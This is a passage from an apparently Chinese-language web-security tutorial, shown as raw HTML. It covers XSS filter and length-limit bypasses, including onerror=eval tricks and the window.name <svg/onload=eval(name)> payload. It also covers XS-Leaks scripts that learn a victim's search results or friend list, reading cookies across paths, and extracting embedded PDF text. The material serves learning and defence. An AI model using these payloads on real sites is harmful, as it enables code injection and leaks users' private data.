string\">`</span></span></code></pre>\n<p>那如果現在連反引號都不能用呢？有沒有其他方法？</p>\n<p>有一個我第一次看到的時候讚嘆了許久的方法：</p>\n<pre class=\"language-js\"><code class=\"language-js\">onerror<span class=\"token operator\">=</span>alert<span class=\"token punctuation\">;</span><span class=\"token keyword\">throw</span> <span class=\"token number\">1</span></code></pre>\n<p>它把 <code>window.onerror</code> 改寫成 <code>alert</code>，再拋出一個錯誤，而這個錯誤因為沒有被 catch 到，就會被 <code>window.onerror</code> 接住，最後被丟到 alert 裡面執行。</p>\n<p>除了 alert 以外，改寫一下就可以執行任意程式碼：</p>\n<pre class=\"language-js\"><code class=\"language-js\">onerror<span class=\"token operator\">=</span>eval<span class=\"token punctuation\">;</span><br><span class=\"token keyword\">throw</span> <span class=\"token string\">\"=alert\\x281\\x29\"</span></code></pre>\n<p>第一行跟剛剛一樣，只是這次把 <code>onerror</code> 變成了 <code>eval</code>，但第二行是在做什麼呢？先講一下那個 <code>\\x28</code> 跟 <code>\\x29</code>，分別是 <code>()</code> 的編碼。</p>\n<p>但為什麼前面多一個 <code>=</code>？</p>\n<p>這是因為把錯誤拋出去的時候，如果是 Chrome，它最後會產生的字串是：<code>Uncaught {err_message}</code>，像是 <code>throw 1</code>，就會產生出 <code>Uncaught 1</code>，但這樣並不是一段 JavaScript 程式碼，丟到 <code>eval</code> 會直接噴出錯誤。</p>\n<p>所以我們把 <code>&quot;=alert\\x281\\x29&quot;</code> 丟出去，就會變成 <code>Uncaught=alert\\x281\\x29</code>，整句變成了一個 expression，<code>Uncaught</code> 被當作是沒有宣告的全域變數，它的值是 <code>alert(1)</code> 的回傳值，如此一來，整段 error message 就變成合法的 JavaScript 程式碼了！利用這樣的方式丟給 eval，就可以正常執行。</p>\n<p>其實還有一些更驚人的手法，但篇幅有限而且有些我也還在努力看懂，所以就先在此打住，以下圖做個總結：</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p2-explosion.jpg\" alt=\"\"></p>\n<h3 id=\"%E5%AD%97%E6%95%B8%E9%99%90%E5%88%B6\"><a class=\"direct-link\" href=\"#%E5%AD%97%E6%95%B8%E9%99%90%E5%88%B6\">#</a> 字數限制</h3>\n<p>除了上面那些屬性以及字元的限制以外，還有另一種限制叫做字數限制。</p>\n<p>舉例來說，如果有個網站的暱稱有 XSS 漏洞，可是只能輸入最多 25 個字，這種情況下只跳出一個 alert 是沒有殺傷力的，你有辦法執行任意程式碼嗎？</p>\n<p>最短的 XSS payload <code>&lt;svg/onload=&gt;</code> 的這個骨架就有 13 個字了，因此我們只剩下 12 個字可以來執行程式碼，這時候就需要用到一個技巧，那就是「利用現有資訊」，像是這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 13 + 18 = 31 字</span><br><span class=\"token operator\">&lt;</span>svg<span class=\"token operator\">/</span>onload<span class=\"token operator\">=</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">'</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token operator\">+</span>location<span class=\"token punctuation\">)</span><span class=\"token operator\">></span></code></pre>\n<p>這短短的程式碼隱藏了不少細節，首先呢，如果你想拿到網址，你會怎麼做？<code>location.href</code> 嗎？更短的做法是把 <code>location</code> 轉成字串，你一樣能拿到網址。但網址本身不是合法的程式碼，所以我們要在前面加上一個單引號，接著再利用網址列上的 <code>#</code>，例如說這樣：<code>https://example.com#';alert(1)</code>，跟單引號拼起來就會變成：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token string\">'https://example.com#'</span><span class=\"token punctuation\">;</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre>\n<p>這就是一段合法的 JavaScript 程式碼了，因為它變成一個字串後面接指令！</p>\n<p>除了 <code>location</code> 以外，<code>document.URL</code> 也可以拿到網址，但這字數明顯比 <code>locaton</code> 多，可是你知道嗎，<code>document</code> 可以省略，變成這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 13 + 13 = 26 字</span><br><span class=\"token operator\">&lt;</span>svg<span class=\"token operator\">/</span>onload<span class=\"token operator\">=</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">'</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token operator\">+</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></code></pre>\n<p>為什麼不需要寫 <code>document</code>？這是因為有個隱藏的規格，在 event handler 裡面的 inline 程式碼，預設就會有 document 這個 scope：</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p3-spec.jpg\" alt=\"\"></p>\n<p>用 debugger 看也很明顯，所以儘管我們只輸入 URL，也會因為 scope 跟 with 的關係找到 document.URL</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p4-debugger.jpg\" alt=\"\"></p>\n<p>只差一個字就可以壓在 25 個字以內了，還有其他招式嗎？有，請先看一下底下的程式碼，你預期的輸出是什麼？</p>\n<pre class=\"language-js\"><code class=\"language-js\">name <span class=\"token operator\">=</span> <span class=\"token number\">123</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> name <span class=\"token operator\">===</span> <span class=\"token string\">'number'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>應該是 true 對吧？123 是數字，十分合理啊！但如果你真的在瀏覽器上面執行，會發現輸出居然是 false，因為 <code>typeof name</code> 是 string！</p>\n<p>這是因為 name 是一個特別的屬性，它代表了這個視窗的名稱，或簡單一點也可以想成是這個分頁的名稱，換句話說，同一個分頁儘管內容不同，依然會共享同一個名稱！</p>\n<p>假設我要攻擊的網站是 <a href=\"http://example.com\">example.com</a>，我的網站是 <a href=\"http://huli.tw\">huli.tw</a>，我可以在我的網站底下這樣寫：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  name <span class=\"token operator\">=</span> <span class=\"token string\">'alert(1)'</span><br>  window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'http://example.com'</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>設置完 name 以後跳轉過去目標網站，接著在目標網站輸入這組 payload：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 13 + 10 = 23 字</span><br><span class=\"token operator\">&lt;</span>svg<span class=\"token operator\">/</span>onload<span class=\"token operator\">=</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token operator\">></span></code></pre>\n<p>因為 name 會共享的關係，就可以成功執行我想要的程式碼，這次只要 23 個字，成功壓在 25 個字以內。</p>\n<p>有一個網站叫做 <a href=\"https://tinyxss.terjanq.me/\">Tiny XSS Payloades</a>，專門收集這些很短的 payload，裡面有更多千奇百怪的 payload，有需要的話可以參考看看，我所知道的 payload 也都是從這個網站來的。</p>\n<h2 id=\"xs-leaks\"><a class=\"direct-link\" href=\"#xs-leaks\">#</a> XS leaks</h2>\n<p>上面講完了一些限制的繞過以後，我們來看看另一個主題，叫做 Cross-Site Leaks（簡寫為 XS Leaks），這個攻擊其實就是網頁上的一種 side-channel attack，有關於 side-channel attack，我之前在 <a href=\"https://blog.huli.tw/2021/02/19/cors-guide-5/\">CORS 完全手冊（五）：跨來源的安全性問題</a>裡面有提到過，用很知名的 Spectre 來舉例。</p>\n<p>什麼是 side-channel attack 呢？就是你透過一些方法「間接」得知了資訊，例如說假設你面前有一個燈泡，但你的眼睛完全看不見，連光源都感受不到，你要怎麼知道這個燈泡現在是亮的還是不亮的？</p>\n<p>有一種方式是透過「溫度」，因為燈泡如果亮著會發光，可能會產生熱能（先假設這前提為真然後忽略一些 edge case，舉例用途而已），因此你摸燈泡的時候就感覺得到熱度，這就是透過溫度間接得知了燈泡亮不亮這個資訊。</p>\n<p>把這個概念用在網頁上的話也是類似的，透過一些方法間接得知網頁上的資訊，我們來看兩個例子。</p>\n<h3 id=\"%E6%90%9C%E5%B0%8B%E8%88%87%E4%B8%8B%E8%BC%89\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E8%88%87%E4%B8%8B%E8%BC%89\">#</a> 搜尋與下載</h3>\n<p>假設現在有一個具有搜尋與下載功能的網站，可以在 query string 直接帶入想要搜尋的字串，例如說 <code>https://example.com/download?q=example</code>，如果資料庫裡面沒有符合的資料，就會出現一個「查無使用者」的畫面：</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p5-search1.png\" alt=\"\"></p>\n<p>反之，如果有資料的話，就會直接跳出原生的檔案下載視窗，讓你直接下載相對應的檔案：</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p6-search2.png\" alt=\"\"></p>\n<p>身為一個攻擊者，我們知道這個資訊以後可以做些什麼呢？</p>\n<p>假設我有一個自己的網站，網址是 <code>https://huli.tw</code>，接著我在我的網站上面把剛剛的範例網站用 iframe 嵌入：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> iframe <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iframe'</span><span class=\"token punctuation\">)</span><br>iframe<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">\"https://example.com/download?q=user01\"</span><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>iframe<span class=\"token punctuation\">)</span></code></pre>\n<p>這時候關鍵的來了，如果 <code>user01</code> 這筆資料不存在於資料庫裡面，當我試著存取 <code>iframe.contentWindow.origin</code> 的時候就會出錯，這是因為 <code>huli.tw</code> 跟 <code>example.com</code> 不是同源的網站，所以被瀏覽器的 Same-Origin Policy 擋了下來。</p>\n<p>但是呢！如果 <code>user01</code> 這筆資料存在於資料庫裡面，不是就會直接跳出下載畫面嗎？這時候如果我去存取 <code>iframe.contentWindow.origin</code>，就不會出錯，因為我會拿到 <code>null</code> 這個結果。</p>\n<p>所以我們可以根據存取 <code>iframe.contentWindow.origin</code> 的結果，得知某個關鍵字是否存在於資料庫裡面：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> iframe <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iframe'</span><span class=\"token punctuation\">)</span><br>iframe<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">\"https://example.com/download?q=user01\"</span><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>iframe<span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// 先假設一秒後會載入完畢，可以做到更精確但先跳過</span><br><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        iframe<span class=\"token punctuation\">.</span>contentWindow<span class=\"token punctuation\">.</span>origin<br>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用者存在'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用者不存在'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span></code></pre>\n<p>這就是 XS leaks，我們明明在 A 網站，卻可以利用一些技巧去得知 B 網站的資訊。</p>\n<p>完整的攻擊實作會把上面的攻擊腳本延伸，例如說先測 <code>a</code> 再測 <code>b</code> 之類的，假設測到 <code>b</code> 是存在的，那就重複剛剛的流程去測 <code>ba</code>, <code>bb</code>...，如此一來就可以洩漏出至少一組的使用者帳號。接著只要把這個網頁的連結傳給有權限存取到 <code>https://example.com/download</code> 頁面而且處於登入狀態下的人，點開以後攻擊就會啟動。</p>\n<p>雖然說聽起來前置步驟有點多，但它確實是個可行的攻擊手法。</p>\n<h3 id=\"id-%E7%9A%84%E5%A5%A7%E5%A6%99\"><a class=\"direct-link\" href=\"#id-%E7%9A%84%E5%A5%A7%E5%A6%99\">#</a> id 的奧妙</h3>\n<p>假設現在有個標榜隱私度極高的社群網站，你沒有辦法看到你好友的好友有誰，看不到共同好友，所以你也不知道誰跟誰是朋友，只知道自己有哪些朋友。</p>\n<p>你跟 user id 是 123 的 David 是好朋友，所以當你點進他的個人頁面：<a href=\"http://example.com/users/123\">http://example.com/users/123</a> 時，會看到一個按鈕「傳送訊息」，按鈕的 id 是 message：</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p7-id1.png\" alt=\"\"></p>\n<p>而你跟 user id 是 210 的 Peter 並不是好友，所以點進他的頁面以後，會看到另一個按鈕叫做「加入好友」，id 是 add：</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p8-id2.png\" alt=\"\"></p>\n<p>這聽起來都沒什麼問題，十分合理的實作，網頁上的元素有 id 再合理不過了。不過，其實這樣也會有 XS leaks 的風險。</p>\n<p>瀏覽器有一個貼心的功能不知道大家有沒有注意過，當網址後面加上 <code>#id</code> 的時候，瀏覽器會自動跳到有這個 id 的段落然後把元素 focus（如果可以被 focus 的話），文章的錨點（anchor）功能就是靠這個，才能跳到特定的段落去。</p>\n<p>因此當我連到 <a href=\"http://example.com/users/123#message\">http://example.com/users/123#message</a> 時，如果我跟 id 為 123 的人是好友，那頁面上就會出現傳送訊息的按鈕，瀏覽器就會跳到按鈕那邊並且把按鈕 focus。那如果我跟 123 不是好友呢？那就不會有任何事情發生。所以我們可以透過這個差異，來知道 id 123 的人是不是當前使用者的好友。</p>\n<p>做法跟剛剛的搜尋下載很像，都是要先把目標網頁嵌入 iframe 之中，如果有這個 id 存在，那 iframe 就會 focus，而原本的 body 就會 blur：</p>\n<pre class=\"language-js\"><code class=\"language-js\">window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onblur</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'是好友'</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> iframe <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iframe'</span><span class=\"token punctuation\">)</span><br>iframe<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">'https://example.com/users/123#message'</span><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>iframe<span class=\"token punctuation\">)</span></code></pre>\n<p>接著把這個網頁傳給你想知道他好友狀況的人，他一打開網頁之後，你就能知道他跟 123 是不是好朋友。如果這個網站的 id 是流水號，你就可以遍歷每一個 id，得知他的好友清單裡面有誰。</p>\n<p>以上就是兩個 XS leaks 的範例，都是透過一些瀏覽器或是 JS 的特性來達成的攻擊，如果你對這些有興趣，可以參考：<a href=\"https://xsleaks.dev/\">XS-Leaks Wiki</a>，裡面有更多更有趣的案例（我所知道的這些也是從這個網站來的）</p>\n<p>如果想看 XS leaks 的實際案例，這邊有很多：<a href=\"https://terjanq.github.io/Bug-Bounty/Google/cache-attack-06jd2d2mz2r0/index.html\">Mass XS-Search using Cache Attack</a>，而最近的這一個也很有趣：<a href=\"https://jub0bs.com/posts/2021-10-12-xsleak-stack/\">Abusing Slack’s file-sharing functionality to de-anonymise fellow workspace members</a></p>\n<h2 id=\"%E5%85%B6%E4%BB%96%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E5%8A%9F%E8%83%BD\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E5%8A%9F%E8%83%BD\">#</a> 其他你可能不知道的功能</h2>\n<p>最後一個段落裡面想跟大家分享一些「你可能不知道」的功能，或更精確一點來說，是「我知道以後很驚訝」的功能，我原本沒有想到原來可以這樣做。</p>\n<h3 id=\"%E8%AE%80%E5%8F%96%E4%B8%8D%E5%90%8C-path-%E7%9A%84-cookie\"><a class=\"direct-link\" href=\"#%E8%AE%80%E5%8F%96%E4%B8%8D%E5%90%8C-path-%E7%9A%84-cookie\">#</a> 讀取不同 path 的 cookie</h3>\n<p>在設定 Cookie 的時候有許多參數可以設置，其中一個叫做 path，例如說我設定 cookie 的 path 是 <code>/siteA</code>，那當我在 <code>/siteB</code> 的時候，就沒辦法讀取到 <code>/siteA</code> 的 cookie，因為 path 不一樣，所以沒辦法拿到。</p>\n<p>但其實不一定，如果你的網站沒有阻擋 iframe 嵌入，而且 cookie 又沒有設置 HttpOnly，就可以利用 iframe 來讀取不同 path 的 cookie：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 假設我們在 https://example.com/siteA</span><br><span class=\"token keyword\">const</span> iframe <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iframe'</span><span class=\"token punctuation\">)</span><br>iframe<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">'https://example.com/siteB'</span><br>iframe<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <br>  <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>iframe<span class=\"token punctuation\">.</span>contentWindow<span class=\"token punctuation\">.</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>iframe<span class=\"token punctuation\">)</span></code></pre>\n<p>這是因為 <code>https://example.com/siteA</code> 跟 <code>https://example.com/siteB</code> 雖然 path 不同，但是是同源的，因此可以直接透過 iframe 來存取同源的其他網頁的 document，就可以利用這個特性拿到 <code>document.cookie</code></p>\n<p>如果沒有支援 iframe，那其實 <code>window.open</code> 也可以達到一樣的效果：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'//example.com/siteB'</span><span class=\"token punctuation\">)</span><br><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>win<span class=\"token punctuation\">.</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span></code></pre>\n<p>不過要注意的是 <code>window.open</code> 預設會被擋住，要使用者主動允許才能開啟，或者是要使用者做操作以後執行（例如說把上面那段放在 button onclick 裡面）。</p>\n<p>而我後來發現其實 <a href=\"https://datatracker.ietf.org/doc/html/rfc6265#section-8.5\">RFC 6265</a> 的 section 8.5: Weak Confidentiality 就有提到了（奇怪，以前讀的時候怎麼沒注意到）：</p>\n<blockquote>\n<p>Cookies do not always provide isolation by path. Although the network-level protocol does not send cookies stored for one path to another, some user agents expose cookies via non-HTTP APIs, such as HTML's document.cookie API.  Because some of these user agents (e.g., web browsers) do not isolate resources received from different paths, a resource retrieved from one path might be able to access cookies stored for another path.</p>\n</blockquote>\n<h3 id=\"%E8%AE%80%E5%8F%96-pdf-%E5%85%A7%E5%AE%B9\"><a class=\"direct-link\" href=\"#%E8%AE%80%E5%8F%96-pdf-%E5%85%A7%E5%AE%B9\">#</a> 讀取 PDF 內容</h3>\n<p>假設你的網站上嵌入了一個 same origin 的 pdf 檔案，像這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>embed</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/test.pdf<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這時候你該怎麼用 JS 去讀取這個 pdf 裡面的內容？想必答案一定就是 fetch 或是 xhr 了：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/test.pdf\"</span><span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> res<span class=\"token punctuation\">.</span><span class=\"token function\">blob</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pdf'</span><span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>那如果 fetch 沒辦法用呢？舉例來說，server 在後端擋住來自 fetch 的請求（利用 <a href=\"https://web.dev/fetch-metadata/\">Fetch Metadata</a>），這時候該怎麼辦呢？有沒有什麼方法可以讀到 PDF 的內容？</p>\n<p>我以前一直覺得不可能有，直到我學到了一個隱藏的 <a href=\"https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/resources/pdf/pdf_viewer.js;l=770\">Chrome API</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">/** @override */</span><br><span class=\"token function\">handleScriptingMessage</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">message</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">handleScriptingMessage</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">delayScriptingMessage</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">case</span> <span class=\"token string\">'getSelectedText'</span><span class=\"token operator\">:</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pluginController_<span class=\"token punctuation\">.</span><span class=\"token function\">getSelectedText</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><br>          <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">handleSelectedTextReply</span><span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">case</span> <span class=\"token string\">'getThumbnail'</span><span class=\"token operator\">:</span><br>      <span class=\"token keyword\">const</span> getThumbnailData <span class=\"token operator\">=</span><br>          <span class=\"token comment\">/** @type {GetThumbnailMessageData} */</span> <span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">const</span> page <span class=\"token operator\">=</span> getThumbnailData<span class=\"token punctuation\">.</span>page<span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pluginController_<span class=\"token punctuation\">.</span><span class=\"token function\">requestThumbnail</span><span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><br>          <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendScriptingMessage</span><span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">case</span> <span class=\"token string\">'print'</span><span class=\"token operator\">:</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pluginController_<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">case</span> <span class=\"token string\">'selectAll'</span><span class=\"token operator\">:</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pluginController_<span class=\"token punctuation\">.</span><span class=\"token function\">selectAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">default</span><span class=\"token operator\">:</span><br>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>從這段程式碼裡面可以看出有兩個指令 <code>selectAll</code> 跟 <code>getSelectedText</code>，前者可以全選 PDF 的內容，後者可以拿到選取的文字，因此只要結合這兩個，就能拿到 PDF 裡面的文字內容：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// HTML: &lt;embed id=\"f\" onload=\"loaded()\" src=\"...\"></span><br><br>window<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'message'</span><span class=\"token punctuation\">,</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>type <span class=\"token operator\">===</span> <span class=\"token string\">'getSelectedTextReply'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>selectedText<span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">function</span> <span class=\"token function\">loaded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  f<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>type<span class=\"token operator\">:</span><span class=\"token string\">'selectAll'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>  